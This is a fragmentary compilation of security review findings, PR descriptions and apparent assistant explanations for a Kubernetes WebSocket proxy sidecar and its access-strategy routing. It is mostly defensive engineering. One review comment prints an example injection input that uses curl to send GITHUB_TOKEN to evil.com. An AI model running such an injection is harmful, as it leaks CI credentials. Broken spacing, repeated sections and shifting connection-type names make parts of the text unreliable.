### #11 [Security] `GOPROXY=direct` in Dockerfile (line 7)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
`GOPROXY=direct` bypasses `proxy.golang.org`'s immutability and checksum guarantees. If an upstream dependency repo is compromised between builds, `go mod download` fetches tampered code. Since this project builds on GitHub Actions (full access to `proxy.golang.org`), this appears to be a leftover from an internal dev setup.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
**Suggestion:** Remove or change to `ENV GOPROXY=https://proxy.golang.org,direct`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
### #12 [Observability] `/metrics` exposed unauthenticated (`server.go:42`)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
`/metrics` is served on the same port (8080) as the WebSocket handler. Metrics expose connection counts, error patterns, and byte transfer rates. If Traefik ForwardAuth only covers the WebSocket path (`/`), `/metrics` may be unintentionally public.

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
**Suggestion:** Serve metrics on a separate port (e.g., `:9090`) accessible only within the cluster via a ClusterIP service. content.data:
This is a thorough security review from bhanderig. Here's each finding summarized with what to do:

---

**Findings that need code changes now (fix in this PR):**

| # | Summary | Fix |
|---|---|---|
| 1 | Expression injection in `release-stage-image.yml` — `${{ inputs.short_sha }}` in `run:` block can be injected | Use `env:` intermediate variable instead of direct interpolation |
| 3 | `ReadLimit` has no bounds validation — negative or zero values disable protection | Add bounds check: 1024 to 10MB |
| 5 | `release-promote-image.yml` has `workflow_dispatch` allowing anyone to bypass gates | Remove `workflow_dispatch` from promote workflow (only allow `workflow_call`) |
| 9 | Missing `ReadHeaderTimeout` on HTTP server — Slowloris vulnerability | Add `ReadHeaderTimeout: 10 * time.Second` |
| 10 | `release.yml` uses golangci-lint `v2.4.0` but `lint.yml` uses `v2.12.2` — version skew | Fix to `v2.12.2` in `release.yml` |
| 11 | `GOPROXY=direct` in Dockerfile bypasses Go module proxy checksums | Change to `ENV GOPROXY=https://proxy.golang.org,direct` |

**Findings that are acceptable/documented (respond but don't fix):**

| # | Summary | Response |
|---|---|---|
| 2 | No auth at proxy layer | By design — ForwardAuth handles this at Traefik. Will add doc comment. |
| 4 | Actions pinned to mutable tags | Will add `dependabot.yml` for automated SHA pinning. Low priority for initial merge. |
| 6 | No per-source rate limiting | Acceptable — each workspace pod has its own proxy, and auth layer provides per-identity gating. Will document. |
| 7 | Revalidation unimplemented — 12h window | Known and documented. Agreed to reduce default to 1-2h as stopgap. |
| 8 | Unsigned lightweight tags | Will use annotated tags. Low risk for now. |
| 12 | `/metrics` unauthenticated | Acceptable for a sidecar — only reachable within the pod network. Metrics port separation is future work. |

---

Want me to fix items 1, 3, 5, 9, 10, 11 now? And for #7, should I reduce the default `MaxSessionDuration` from 12h to 2h?

[Security] GitHub Actions expression injection. ${{ inputs.short_sha }} is interpolated directly into this run: shell block. Since this workflow has workflow_dispatch, inputs bypass the version regex validation in release.yml.

A malicious input like "; curl evil.com?t=$GITHUB_TOKEN; echo " would execute arbitrary commands with packages:write access.

Suggestion: Use an intermediate env var:

- name: Resolve short SHA
  id: sha
  env:
    INPUT_SHA: ${{ inputs.short_sha }}
  run: |
    SHA="$INPUT_SHA"
    if [ -z "$SHA" ]; then
      SHA=$(git rev-parse --short HEAD)
    fi
    echo "short_sha=$SHA" >> "$GITHUB_OUTPUT"

Same pattern should be applied in release-promote-image.yml for the crane copy commands.

Additional Findings (not in diff — existing code or unchanged files)

These findings apply to code/files not changed in this PR, but are relevant to the security posture of the release being shipped:
#2 [Security] No auth at proxy layer (server.go:83)

CheckOrigin always returns true and handleWebSocket performs no authentication. The comment mentions Traefik ForwardAuth handles this externally — that's fine if always true, but consider adding a startup log warning when REVALIDATION_ENDPOINT is empty, and a doc comment on handleWebSocket noting the auth precondition for future deployers.
#6 [Reliability] No per-source rate limiting (session.go:37)

The flat MaxConnections cap (default 10) has no per-source tracking. A single client can hold all 10 slots for 12 hours, completely denying service. If the auth layer provides per-identity rate limiting this is acceptable, but worth documenting. Otherwise consider a per-source-IP limit or shorter idle timeout.
#9 [Reliability] Missing ReadHeaderTimeout (server.go:45)

The http.Server has no ReadHeaderTimeout. An attacker can Slowloris the upgrade path — send HTTP headers one byte/second, holding goroutines + FDs. With only 10 connection slots, ~10 slow connections exhaust all capacity.

ReadHeaderTimeout only applies to the initial HTTP upgrade, not established WebSocket sessions.

Suggestion:

s.httpServer = &http.Server{
    Addr:              config.ListenAddr,
    Handler:           mux,
    ReadHeaderTimeout: 10 * time.Second,
}

#11 [Security] GOPROXY=direct in Dockerfile (line 7)

GOPROXY=direct bypasses proxy.golang.org's immutability and checksum guarantees. If an upstream dependency repo is compromised between builds, go mod download fetches tampered code. Since this project builds on GitHub Actions (full access to proxy.golang.org), this appears to be a leftover from an internal dev setup.

Suggestion: Remove or change to ENV GOPROXY=https://proxy.golang.org,direct.
#12 [Observability] /metrics exposed unauthenticated (server.go:42)

/metrics is served on the same port (8080) as the WebSocket handler. Metrics expose connection counts, error patterns, and byte transfer rates. If Traefik ForwardAuth only covers the WebSocket path (/), /metrics may be unintentionally public.

Suggestion: Serve metrics on a separate port (e.g., :9090) accessible only within the cluster via a ClusterIP service.

* Atomic CAS session counting — no race conditions
* `writeWait` deadline on all writes prevents hung-write resource exhaustion
* Bridge closes both directions on first error — no half-open leaks
* Dockerfile COPY uses explicit paths (no secret leakage)

Completes the sidecar package with release infrastructure, end-to-end tests, and addresses all
remaining review feedback. ## Changes

### Release workflows
* `release-stage-image. yml` — Multi-platform build (amd64/arm64), push to
  `ghcr. io/jupyter-infra/staging/`
* `release-promote-image. yml` — Promotes staging image to `ghcr. io/jupyter-infra/` via crane
* `release. yml` — Orchestrates: validate → lint → test → stage → promote → git tag → GitHub
  release

### E2E tests with Kind
* Ginkgo/Gomega test suite with `//go:build e2e` tag (excluded from `make test`)
* Test pod: ws-proxy sidecar + socat echo server
* Tests: WebSocket bridge echo, connection capacity rejection (503), health endpoint
* Make targets: `setup-test-e2e`, `test-e2e`, `test-e2e-focus`, `test-e2e-full`,
  `cleanup-test-e2e`

### Code quality
* `LoadConfig()` returns error instead of panicking
* `TargetPort` changed from string to int (reviewer feedback)
* `ReadLimit` added to prevent memory exhaustion from oversized frames
* Ping interval < ping timeout validation
* Healthcheck port parsing handles all address formats (`0. 0. 0. 0:8080`, `:8080`)
* Removed unused `sync. Mutex` from SessionManager
* Added revalidator TODO hook in session for future implementation
* All lint issues resolved (0 issues)

### Makefile improvements
* `SHELL`/`. SHELLFLAGS` for proper error propagation in recipes
* `GOLANGCI_LINT_VERSION` pinned for CI consistency
* `release` target (build + lint + test pre-PR gate)
* `test-e2e-focus` for running specific E2E tests

## Testing
* `make release` passes (build + lint + test, 88. 2% coverage)
* `make test-e2e-full CONTAINER_TOOL=docker` passes (3/3 E2E specs)

## Security Review Summary

Reviewed for: trust boundaries, network exposure, CI/CD supply chain, resource exhaustion, and connection lifecycle. ### Validated as Safe ✓
* Distroless image with non-root user (UID 65532)
* `CGO_ENABLED=0` static binary — no libc attack surface
* E2E tests gated behind `//go:build e2e` — no test deps in prod
* Atomic CAS session counting — no race conditions
* `writeWait` deadline on all writes prevents hung-write resource exhaustion
* Bridge closes both directions on first error — no half-open leaks
* Dockerfile COPY uses explicit paths (no secret leakage)

### [#2][176] [Security] No auth at proxy layer (`server. go:83`)

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
`CheckOrigin` always returns true and `handleWebSocket` performs no authentication. The comment mentions Traefik ForwardAuth handles this externally — that's fine if always true, but consider adding a startup log warning when `REVALIDATION_ENDPOINT` is empty, and a doc comment on `handleWebSocket` noting the auth precondition for future deployers. ### #6 [Reliability] No per-source rate limiting (`session. go:37`)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
The flat `MaxConnections` cap (default 10) has no per-source tracking. A single client can hold all 10 slots for 12 hours, completely denying service. If the auth layer provides per-identity rate limiting this is acceptable, but worth documenting. Otherwise consider a per-source-IP limit or shorter idle timeout. ### #9 [Reliability] Missing `ReadHeaderTimeout` (`server. go:45`)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
The `http. Server` has no `ReadHeaderTimeout`. An attacker can Slowloris the upgrade path — send HTTP headers one byte/second, holding goroutines + FDs. With only 10 connection slots, ~10 slow connections exhaust all capacity. ### #12 [Observability] `/metrics` exposed unauthenticated (`server. go:42`)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
`/metrics` is served on the same port (8080) as the WebSocket handler. Metrics expose connection counts, error patterns, and byte transfer rates. If Traefik ForwardAuth only covers the WebSocket path (`/`), `/metrics` may be unintentionally public. **Suggestion:** Serve metrics on a separate port (e. g. , `:9090`) accessible only within the cluster via a ClusterIP service. New comment from bhanderig on `release.yml`:

**What he's saying:** The `VERSION="${{ inputs.version }}"` line in the `validate` step has the same expression injection issue we fixed in `release-stage-image.yml`. Even though the regex on the next line would reject bad input, the injection happens *before* the validation runs. He wants us to use the `env:` indirection pattern here too (and same for `dry_run`).

**The fix:** Change the validate step to use `env:` variables instead of direct interpolation:

```yaml
- name: Validate inputs
  id: validate
  env:
    VERSION: ${{ inputs.version }}
    DRY_RUN: ${{ inputs.dry_run }}
  run: |
    if ! echo "$VERSION" | grep -qE ...
```

**Reply to post:** "Good catch, same pattern as the stage fix. Will apply."

## Summary

Adds support for extracting JWT tokens from the `Authorization: Bearer` header in the bearer auth middleware, alongside the existing URL query parameter (`?token=`) method.

## Motivation

WebSocket connections via websocat pass the JWT token as an HTTP header (`-H "Authorization: Bearer <token>"`) rather than a URL query parameter. This avoids tokens appearing in Traefik/ALB access logs. See design doc: [Parker WebSocket](https://quip-amazon.com/72OzARFCXng2/Parker-WebSocket).

- `serverroute_bearer_auth.go`: Check `Authorization: Bearer <token>` header first, fall back to `?token=` query param if header not present
- `serverroute_bearer_auth_test.go`: 3 new tests (valid header, invalid header, empty bearer token)

## Backward Compatibility

Fully backward compatible. Existing web UI flows using `?token=` in the URL continue working unchanged. The Authorization header is only used when present.

content.data:
The response only has `WorkspaceConnectionURL` (single string) and `WorkspaceConnectionType`. We can't add a separate token field without a CRD change — and the design doc says no CRD changes.

The pragmatic solution: return the URL with the token as a query parameter (`wss://host/ssh-ws?token=<jwt>`). The connect script / Toolkit extracts the token from the URL and passes it via header to websocat. The token never hits Traefik logs because websocat sends it as a header, not in the URL — the URL the client opens is just `wss://host/ssh-ws` with the Authorization header.

So the Extension API returns: `wss://host/ssh-ws?token=<jwt>` (for transport to the client), and the connect script parses it into URL + token, then runs: `websocat --binary -H="Authorization: Bearer <token>" asyncstdio: wss://host/ssh-ws`

This matches what the design doc described and keeps the response API unchanged.

Now I have the full picture. Here's how it works:

---

**Current SSM setup (in `aws-hyperpod` chart):**

```yaml
# Default handler for web-ui connections (k8s-native = generate JWT + bearer URL)
createConnectionHandler: "k8s-native"

# Override for remote connections — route to the AWS plugin
createConnectionHandlerMap:
  vscode-remote: "aws:createSession"
  kiro-remote: "aws:createSession"
  cursor-remote: "aws:createSession"

# Pod lifecycle — AWS plugin handles registration/cleanup
podEventsHandler: "aws:ssm-remote-access"
```

When a user requests `vscode-remote`, `resolveConnectionHandler` finds it in `createConnectionHandlerMap` → `"aws:createSession"` → parsed as plugin `"aws"`, action `"createSession"` → routes to the AWS plugin which calls SSM APIs.

**What we've added for WebSocket:**

For WebSocket, the access strategy would look like:

```yaml
# Default handler for both web-ui AND remote connections (all k8s-native)
createConnectionHandler: "k8s-native"

# No createConnectionHandlerMap needed (or override specific IDEs if needed)
createConnectionHandlerMap:
  vscode-remote: "k8s-native"
  kiro-remote: "k8s-native"
  cursor-remote: "k8s-native"

# No podEventsHandler — proxy is stateless, no pod lifecycle hooks

# bearerAuthURLTemplate used for BOTH web-ui and websocket URL generation
bearerAuthURLTemplate: "https://{{ .Workspace.Name }}-{{ b32encode .Workspace.Namespace }}.workspaces.example.com/ssh-ws"
```

When a user requests `vscode-remote`:
1. `resolveConnectionHandler` finds `"k8s-native"` in the handler map
2. Code hits `if pluginName == handlerK8sNative` → calls `generateWebSocketConnectionURL`
3. Function uses `BearerAuthURLTemplate` to build the URL, swaps scheme to `wss://`, generates JWT, returns `wss://host/ssh-ws?token=<jwt>`

**Key points:**
- No CRD changes — we reuse `BearerAuthURLTemplate`, `CreateConnectionHandlerMap`, and `DeploymentModifications` (for the proxy sidecar)
- The `BearerAuthURLTemplate` field does double duty: web UI uses it for the `https://` bearer-auth URL, WebSocket uses it to derive the `wss://` URL
- `PodEventsHandler` is omitted for WebSocket — the proxy sidecar has no registration/cleanup lifecycle
- The proxy sidecar is injected via `deploymentModifications.podModifications.additionalContainers` (same mechanism as SSM sidecar)

Good question. Let me think about this carefully.

**Current state of the code:**

The `HandleConnectionCreate` routing works like this:
- `web-ui` → hardcoded to `generateBearerTokenURL`
- Everything else (matching `*-remote` pattern) → goes through `resolveConnectionHandler` → looks up in `createConnectionHandlerMap` / `createConnectionHandler`

**What we implemented:**

When `resolveConnectionHandler` returns `"k8s-native"` for a remote connection type (e.g. `vscode-remote`), we call `generateWebSocketConnectionURL`. So the user would still use `workspaceConnectionType: vscode-remote` — the same connection type as SSM, just routed differently by the access strategy.

**The question: do we need a new connection type like `websocket`?**

No — and here's why:

The connection type represents **what the user wants** (connect their VS Code remotely), not **how** it's implemented (SSM vs WebSocket). The access strategy's handler map determines the "how." The same `vscode-remote` type can route to SSM (`aws:createSession`) on one workspace or to WebSocket (`k8s-native`) on another, depending on which access strategy the workspace uses.

This is the correct design because:
- A user says "I want to connect VS Code" — they don't care if it's SSM or WebSocket
- The admin decides the method by choosing the access strategy
- The Toolkit/client doesn't need to know the implementation — it sends `vscode-remote` and gets back a URL (either `vscode://` for SSM or `wss://` for WebSocket)

**So: no changes needed for this.** The connection type stays `vscode-remote` (or `kiro-remote`, `cursor-remote`). The access strategy configuration determines whether it routes to the AWS plugin or to the k8s-native WebSocket handler.

The `WorkspaceAccessStrategy` resource has a field called `createConnectionHandlerMap`. This is where the admin decides how each connection type is handled.

**For SSM:**
```yaml
createConnectionHandlerMap:
  vscode-remote: "aws:createSession"
```
This means: when someone requests `vscode-remote`, route to the AWS plugin.

**For WebSocket:**
```yaml
createConnectionHandlerMap:
  vscode-remote: "k8s-native"
```
This means: when someone requests `vscode-remote`, handle it natively (generate JWT, return `wss://` URL).

The user sends the exact same request in both cases:
```
workspaceConnectionType: vscode-remote
```

The difference is which `WorkspaceAccessStrategy` the workspace references. A workspace referencing the SSM access strategy gets SSM. A workspace referencing the WebSocket access strategy gets WebSocket. The user doesn't know or care — they just get a URL back that works.
how does WorkspaceAccessStrategy work in general? give me some explanation. when do admins set it? is it per cluster or per-workspace? explain it please

A `WorkspaceAccessStrategy` is a namespaced Kubernetes resource that an admin creates once, then multiple workspaces reference it. It's not per-cluster and not per-workspace — it's a **shared template** that any number of workspaces can point to.

**When it's created:** The admin creates it at cluster setup time, usually via a Helm chart (like `aws-hyperpod` creates one called `hyperpod-access-strategy`). It defines how workspaces in that cluster/namespace get accessed — what sidecars they get, what ingress routes are created, what connection handler is used.

**How a workspace references it:**
```yaml
apiVersion: workspace.jupyter.org/v1alpha1
kind: Workspace
metadata:
  name: my-workspace
spec:
  accessStrategy:
    name: hyperpod-access-strategy
```

**What it controls:**
- What sidecar containers get injected (SSM agent, WebSocket proxy, or nothing)
- What Kubernetes resources get created for routing (IngressRoutes, Services)
- How connection URLs are generated (which handler: AWS plugin or k8s-native)
- What happens on pod start/stop (SSM registration, or nothing)

**Typical setup:** A cluster has one or two access strategies. All workspaces in that cluster point to the same one. If an admin wants to switch from SSM to WebSocket, they create a new access strategy with `k8s-native` handlers and point workspaces to it. They don't touch the workspaces themselves — just change which strategy they reference.

When a connection request comes in, the Extension API does this:

1. Looks at `workspaceConnectionType` in the request
2. If it's `web-ui` → hardcoded path, generates bearer token URL
3. If it matches the `*-remote` pattern (validated by regex: `^[a-zA-Z0-9]+(?:-[a-zA-Z0-9]+)*-remote$`) → goes through the handler lookup

For the handler lookup:

```
resolveConnectionHandler(accessStrategy, "vscode-remote")
```

This function checks:
1. First: is `"vscode-remote"` in `createConnectionHandlerMap`? If yes, use that value.
2. Fallback: is `createConnectionHandler` set? If yes, use that as default for all types.

Whatever value it finds (e.g. `"aws:createSession"` or `"k8s-native"`), it parses it:
- `"aws:createSession"` → plugin name `"aws"`, action `"createSession"` → routes to the AWS plugin sidecar
- `"k8s-native"` → plugin name `"k8s-native"`, action `""` → handled directly by the operator (our new WebSocket code)

So `vscode-remote`, `kiro-remote`, `cursor-remote`, or any future `whatever-remote` all go through the same lookup. The access strategy decides what happens — the connection type is just a key into the map. There's no hardcoded behavior per IDE — it's all configuration.
where is createConnectionHandlerMap set?

In the `WorkspaceAccessStrategy` YAML. The admin defines it when they create the access strategy.

For example, in the `aws-hyperpod` Helm chart (`charts/aws-hyperpod/templates/hyperpod-access-strategy.yaml`):

```yaml
createConnectionHandlerMap:
  vscode-remote: "aws:createSession"
  kiro-remote: "aws:createSession"
  cursor-remote: "aws:createSession"
```

For a WebSocket access strategy, it would be:

```yaml
createConnectionHandlerMap:
  vscode-remote: "k8s-native"
  kiro-remote: "k8s-native"
  cursor-remote: "k8s-native"
```

Or even simpler — just set the default handler and skip the map entirely:

```yaml
createConnectionHandler: "k8s-native"
```

This makes all connection types (including all `*-remote`) route to `k8s-native` by default, without needing to list each IDE explicitly.

content.data:
Now I see it clearly. Here's the analysis:

---

**Why SSM needs separate connection types per IDE:**

The SSM flow returns a **deep link URL** that's specific to each IDE. The URL scheme is different:
- `vscode-remote` → returns `vscode://amazonwebservices.aws-toolkit-vscode/connect/workspace?sessionId=...`
- `kiro-remote` → returns `kiro://amazonwebservices.aws-toolkit-kiro/connect/workspace?sessionId=...`
- `cursor-remote` → returns `cursor://...`

Each IDE has its own URL scheme that triggers its specific extension. The `connectionType` is used to determine which `ide://` scheme to put in the returned URL. That's why `connectionScheme()` strips `-remote` and builds `ide://amazonwebservices.aws-toolkit-vscode/connect/workspace`.

**Does WebSocket need this separation?**

No. For WebSocket, the returned URL is always `wss://host/ssh-ws?token=<jwt>` regardless of which IDE the user is connecting from. The `wss://` URL is IDE-agnostic — VS Code, Kiro, and Cursor all use websocat the same way. The Toolkit on each IDE extracts the token and runs websocat identically.

**So should we have a separate connection type?**

There are two valid approaches:

**Option A: Keep using `vscode-remote` / `kiro-remote` (current implementation)**
- The access strategy maps each to `k8s-native`
- `generateWebSocketConnectionURL` ignores the IDE name — returns the same `wss://` URL regardless
- Pro: user doesn't need to know the connection method; same request for SSM or WebSocket
- Con: slightly misleading — the type says "vscode-remote" but it's actually going through WebSocket, not a VS Code-specific protocol

**Option B: Add a new generic type like `remote` (no IDE prefix)**
- User requests `workspaceConnectionType: remote`
- Access strategy maps `remote: "k8s-native"`
- Returns `wss://` URL
- Pro: cleaner — a single type for all IDEs since WebSocket is IDE-agnostic
- Con: requires client changes (Toolkit needs to know to send `remote` instead of `vscode-remote` when the workspace uses WebSocket). Also doesn't match the `*-remote` regex pattern we validate against.

**My recommendation: Option A (current implementation).** 

Reason: the connection type represents what the **client** wants ("I'm VS Code and I want a remote connection"), not how it's implemented. The client (Toolkit) shouldn't need to know whether the backend uses SSM or WebSocket — it just sends `vscode-remote` and gets back a URL that works. This is the whole point of the access strategy abstraction. If we add a new type, the Toolkit needs conditional logic to decide which type to request, which defeats the purpose.

The slight redundancy (all three map to the same handler) is acceptable and is actually the correct separation of concerns — the admin could theoretically configure different behavior per IDE in the future if needed.

**PR Title:** feat: add WebSocket connection type for k8s-native remote connections

```markdown
## Summary

Adds `websocket` as a new connection type in the Extension API. When requested, the API generates a JWT token and returns a `wss://` URL — no external plugin or cloud service needed.

This is part of the WebSocket remote connection feature ([design doc](https://quip-amazon.com/72OzARFCXng2/Parker-WebSocket)) which enables remote IDE connections through the cluster's existing ingress infrastructure.

## Changes

- `api/connection/v1alpha1/workspace_connection_types.go`: Added `ConnectionTypeWebSocket = "websocket"` constant
- `internal/extensionapi/serverroute_connection.go`: 
  - Added `websocket` case in the connection type switch (calls `generateWebSocketConnectionURL`)
  - Added `generateWebSocketConnectionURL` function (generates JWT, builds `wss://` URL from `BearerAuthURLTemplate`)
  - Updated validation to accept `websocket` as a valid connection type
- `internal/extensionapi/serverroute_connection_test.go`: 5 new unit tests + updated validation error messages

## Usage

Request a WebSocket connection:
```yaml
apiVersion: connection.workspace.jupyter.org/v1alpha1
kind: WorkspaceConnection
metadata:
  namespace: default
spec:
  workspaceName: my-workspace
  workspaceConnectionType: websocket
```

Response:
```json
{
  "status": {
    "workspaceConnectionType": "websocket",
    "workspaceConnectionUrl": "wss://my-workspace-mzxw6ytb.workspaces.example.com/ssh-ws?token=<jwt>"
  }
}
```

The client extracts the token from the URL and passes it via `Authorization: Bearer` header when connecting with websocat.

## Access Strategy Configuration

The workspace's access strategy needs `BearerAuthURLTemplate` configured:
```yaml
apiVersion: workspace.jupyter.org/v1alpha1
kind: WorkspaceAccessStrategy
metadata:
  name: websocket-access
spec:
  bearerAuthURLTemplate: "https://{{ .Workspace.Name }}-{{ b32encode .Workspace.Namespace }}.workspaces.example.com/ssh-ws"
```

## Backward Compatibility

Fully backward compatible. Existing `web-ui` and `*-remote` connection types are unchanged. The `websocket` type is a new addition.

## Testing

- `make build` passes
- `make test` passes (5 new unit tests)
- `make lint` passes
- E2E tests will be added in a follow-up once the full stack (IngressRoute, proxy sidecar, access strategy) is deployed together
```

The Service is created with only workspace info — the access strategy isn't passed to `BuildService`. However, looking at the existing `aws-hyperpod` chart again, the access strategy creates **separate** access resources (IngressRoutes) that reference the Service by name. The IngressRoute template already has access to `{{ .Service.Name }}` and `{{ .Service.Namespace }}`.

The question is: can an IngressRoute target a specific port on a Service that doesn't expose that port? No — the Service must expose the port for the IngressRoute to route to it.

**The simplest fix that follows existing patterns:** Create a separate Service via `accessResourceTemplates` (same as the direct SSH service does in `aws-hyperpod`). This requires zero code changes — just YAML configuration in the access strategy.

Looking back at the direct SSH example:
```yaml
- kind: Service
  apiVersion: v1
  namePrefix: ssh
  template: |
    spec:
      ports:
        - name: ssh
          port: 2222
          targetPort: 2222
```

We can do the same for WebSocket:
```yaml
- kind: Service
  apiVersion: v1
  namePrefix: ws-proxy
  template: |
    spec:
      selector:
        workspace.jupyter.org/workspace-name: "{{ .Workspace.Name }}"
      ports:
        - name: websocket
          port: 8080
          targetPort: 8080
```

This creates a second Service per workspace that exposes port 8080, and the IngressRoute references this Service instead of the main one.

### How Routing Works

1. User POSTs `{"workspaceConnectionType": "ssh-over-websocket", "workspaceName": "my-ws"}` to Extension API
2. Extension API validates user auth, checks workspace available, looks up access strategy

7. Traefik matches IngressRoute → ForwardAuth validates JWT → proxies to ws-proxy Service :8080
8. ws-proxy sidecar bridges WebSocket ↔ TCP localhost:2222 (remote access server)

### What This Is

We're implementing WebSocket-based remote IDE connections for the jupyter-k8s Kubernetes operator. This is an open-source, cloud-agnostic alternative to the current AWS SSM-based remote access. The feature allows users to connect VS Code, Kiro, or Cursor to workspace pods over WebSocket, routed through the cluster's existing Traefik ingress — no AWS services needed.

### What We Want To Do (The Big Picture)

Remote connections let users connect a desktop IDE to a workspace pod. Currently this only works via AWS SSM (requires IAM, SSM agent sidecar, registration, cleanup, AWS-only). We're adding WebSocket as an alternative that:

1. Routes through the cluster's existing ingress (Load Balancer → Traefik → pod)
2. Uses a lightweight proxy sidecar (our custom Go binary) instead of the SSM agent
3. Authenticates via JWT (same system as web UI) instead of AWS IAM
4. Is stateless (no registration, no cleanup, no state files)
5. Works on any Kubernetes cluster (GKE, AKS, on-prem, not just AWS)

The user experience: send `workspaceConnectionType: ssh-over-websocket` to the Extension API → get back a `wss://` URL with JWT → client connects via websocat with the token in an Authorization header → Traefik validates JWT → proxies to ws-proxy sidecar → sidecar bridges to remote access server on localhost:2222.

### Task 4-6 Detail (What's Next)

Tasks 4, 5, and 6 are all part of one deliverable: a sample `WorkspaceAccessStrategy` YAML that enables WebSocket remote access. No Go code changes needed — the operator already supports all the mechanisms via configuration:

**What the access strategy needs:**

```yaml
apiVersion: workspace.jupyter.org/v1alpha1
kind: WorkspaceAccessStrategy
metadata:
  name: websocket-access-strategy
spec:
  # How connections are handled
  createConnectionHandler: "k8s-native"
  
  # URL template for generating wss:// URLs (Extension API uses this)
  bearerAuthURLTemplate: "https://{{ .Workspace.Name }}-{{ b32encode .Workspace.Namespace }}.workspaces.example.com/ssh-ws"
  
  # Access resources created per-workspace (IngressRoute + Service for the proxy)
  accessResourceTemplates:
    # Service exposing the ws-proxy sidecar port
    - kind: Service
      apiVersion: v1
      namePrefix: ws-proxy
      template: |
        spec:
          selector:
            workspace.jupyter.org/workspace-name: "{{ .Workspace.Name }}"
          ports:
            - name: websocket
              port: 8080
              targetPort: 8080
    
    # IngressRoute for WebSocket path
    - kind: IngressRoute
      apiVersion: traefik.io/v1alpha1
      namePrefix: ws-route
      template: |
        spec:
          entryPoints:
            - websecure
          routes:
            - match: "Host(`{{ .Workspace.Name }}-{{ b32encode .Workspace.Namespace }}.workspaces.example.com`) && PathPrefix(`/ssh-ws`)"
              kind: Rule
              priority: 110
              middlewares:
                - name: authmiddleware-bearer-auth
                  namespace: jupyter-k8s-system
              services:
                - name: "ws-proxy-{{ .Workspace.Name }}"
                  namespace: "{{ .Workspace.Namespace }}"
                  port: 8080

  # Sidecar injection — adds the ws-proxy container to workspace pods
  deploymentModifications:
    podModifications:
      additionalContainers:
        - name: ws-proxy
          image: ghcr.io/jupyter-infra/workspace-websocket-proxy:latest
          ports:
            - containerPort: 8080
          env:
            - name: TARGET_PORT
              value: "2222"
            - name: MAX_SESSION_DURATION
              value: "12h"
          readinessProbe:
            httpGet:
              path: /health
              port: 8080
            initialDelaySeconds: 1
            periodSeconds: 2
          livenessProbe:
            httpGet:
              path: /health
              port: 8080
            periodSeconds: 10
  
  # No podEventsHandler — proxy is stateless, no lifecycle hooks needed
```

**Key difference from SSM access strategy:** No `podEventsHandler`, no `podEventsContext`, no init containers, no shared volumes, no state files. Much simpler.

